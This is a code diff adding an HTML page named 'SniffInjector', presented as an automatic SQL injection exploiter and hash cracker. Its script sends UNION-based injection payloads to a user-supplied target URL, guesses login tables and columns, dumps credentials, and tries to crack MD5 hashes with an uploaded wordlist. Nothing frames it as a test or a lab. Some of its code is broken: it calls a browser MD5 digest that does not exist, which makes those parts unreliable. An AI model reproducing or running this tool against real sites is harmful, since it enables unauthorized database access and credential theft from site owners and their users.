@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-VKE3HLYFSN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-VKE3HLYFSN');
+</script>
+  <meta charset="UTF-8" />
+  <title>SniffInjector 🦂</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    input, button {
+      background: #222;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 6px;
+      margin-bottom: 10px;
+      width: 100%;
+    }
+    pre {
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>💉 SniffInjector – Auto SQL Exploiter + Hash Cracker</h2>
+  <input type="text" id="target" placeholder="Enter target vulnerable URL (e.g. http://site.com/page.php?id=1)">
+  <input type="file" id="wordlist" accept=".txt" />
+  <button onclick="run()">Start Injection</button>
+  <pre id="log">💉 Ready to inject...</pre>
+
+  <script>
+    const log = document.getElementById('log');
+    const sleep = ms => new Promise(r => setTimeout(r, ms));
+    const payloads = [
+      "' AND 1=1--",
+      "' AND 1=2--",
+      "' OR '1'='1",
+      "' OR '1'='2",
+      "' UNION SELECT NULL--"
+    ];
+
+    async function run() {
+      const target = document.getElementById('target').value;
+      if (!target) return log.textContent += '\n❌ Please enter a URL!';
+      log.textContent = '💉 Starting full injection sequence...\n';
+
+      const base = await fetch(target).then(r => r.text()).catch(() => '');
+      const baseLen = base.length;
+      log.textContent += `[+] Base Page Length: ${baseLen}\n\n`;
+
+      log.textContent += '💉 Detecting column count using UNION SELECT...\n';
+      let colCount = 0;
+      for (let i = 1; i <= 10; i++) {
+        const unionPayload = `' UNION SELECT ${Array(i).fill('NULL').join(',')}--`;
+        const res = await fetch(target + unionPayload).then(r => r.text()).catch(() => '');
+        if (res && res.length !== baseLen) {
+          colCount = i;
+          log.textContent += `✅ Found working UNION SELECT with ${i} column(s)! 🎯\n`;
+          break;
+        }
+      }
+
+      if (!colCount) {
+        log.textContent += `❌ Failed to detect column count.\n`;
+        return;
+      }
+
+      log.textContent += `\n🔍 Attempting login table name detection...\n`;
+      const guessTables = ['users', 'admin', 'login', 'accounts'];
+      let foundTable = '';
+      for (const tbl of guessTables) {
+        const test = await fetch(target + `' UNION SELECT 1 FROM ${tbl}--`).then(r => r.text()).catch(() => '');
+        if (test && test.length !== baseLen) {
+          foundTable = tbl;
+          log.textContent += `✅ Login table found: ${tbl}\n`;
+          break;
+        }
+      }
+
+      if (!foundTable) {
+        log.textContent += `❌ No common login table found. Try manual fuzzing.\n`;
+        return;
+      }
+
+      const columns = ['username', 'user', 'email', 'login', 'password', 'pass', 'hash'];
+      let foundUser = '', foundPass = '';
+      log.textContent += `\n🔎 Scanning for login columns in ${foundTable}...\n`;
+
+      for (const userCol of columns) {
+        for (const passCol of columns) {
+          if (userCol === passCol) continue;
+          const comboPayload = `' UNION SELECT ${userCol},${passCol} FROM ${foundTable}--`;
+          const response = await fetch(target + comboPayload).then(r => r.text()).catch(() => '');
+          if (response && response.length !== baseLen) {
+            foundUser = userCol;
+            foundPass = passCol;
+            log.textContent += `✅ Found login columns: ${foundUser}, ${foundPass}\n`;
+            break;
+          }
+        }
+        if (foundUser && foundPass) break;
+      }
+
+      if (!foundUser || !foundPass) {
+        log.textContent += `❌ Could not determine user/pass columns.\n`;
+        return;
+      }
+
+      log.textContent += `\n💾 Extracting credentials...\n`;
+      const dumpPayload = `' UNION SELECT ${foundUser}, ${foundPass} FROM ${foundTable}--`;
+      const dump = await fetch(target + dumpPayload).then(r => r.text()).catch(() => '');
+      log.textContent += `📄 Raw Credentials Response:\n${dump.slice(0, 1000)}...\n\n`;
+
+      if (dump.match(/[a-f0-9]{32}|[a-f0-9]{40}/i)) {
+        log.textContent += `🧠 Detected potential MD5/SHA1 hashes. Starting hash cracking...\n`;
+
+        const fileInput = document.getElementById('wordlist');
+        const file = fileInput.files[0];
+        if (!file) {
+          log.textContent += `❌ No wordlist uploaded. Please provide a .txt wordlist.\n`;
+          return;
+        }
+
+        const text = await file.text();
+        const words = text.split('\n');
+        const hashes = [...dump.matchAll(/[a-f0-9]{32,40}/gi)].map(m => m[0]);
+
+        for (const hash of hashes) {
+          for (const word of words) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(word.trim());
+            const md5 = await crypto.subtle.digest("MD5", data);
+            const hex = [...new Uint8Array(md5)].map(b => b.toString(16).padStart(2, '0')).join('');
+            if (hex === hash.toLowerCase()) {
+              log.textContent += `🔓 Cracked MD5: ${hash} = ${word.trim()}\n`;
+              break;
+            }
+          }
+        }
+        log.textContent += `✅ Hash cracking completed.\n`;
+      } else {
+        log.textContent += `ℹ️ No hashes found to crack.\n`;
+      }
+
+      log.textContent += `\n✅ Injection completed. 🎉\n`;
+    }
+  </script>
+<script>
+  document.addEventListener("contextmenu", function (e) {
+    e.preventDefault();
+  });
+</script>
+
+</p>
+</body>
+</html>
